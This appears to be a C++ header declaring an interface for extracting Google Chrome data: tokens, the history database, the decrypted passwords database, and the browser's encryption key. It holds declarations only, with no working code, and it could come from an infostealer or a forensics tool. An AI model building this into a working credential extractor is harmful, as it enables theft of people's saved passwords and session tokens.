#pragma once
#include "stdafx.h"

namespace google
{
    class IGoogleDbExtractor
    {
    public:
        virtual void ExtractTokens(std::map<std::string, std::vector<unsigned char>>& tokens) = 0;
        virtual std::string GetGoogleChromeSystemDir() = 0;
        virtual void CopyHistoryDb() = 0;
        virtual void DecryptPasswordsDb() = 0;
        virtual void CopyGoogleChromeFullDirWithKey() = 0;
    protected:
        virtual void GetKey(std::vector<unsigned char>& dbKey) = 0;
    private:
        virtual std::string GetUName() = 0;
    protected:
        std::string _userName;
    };
}
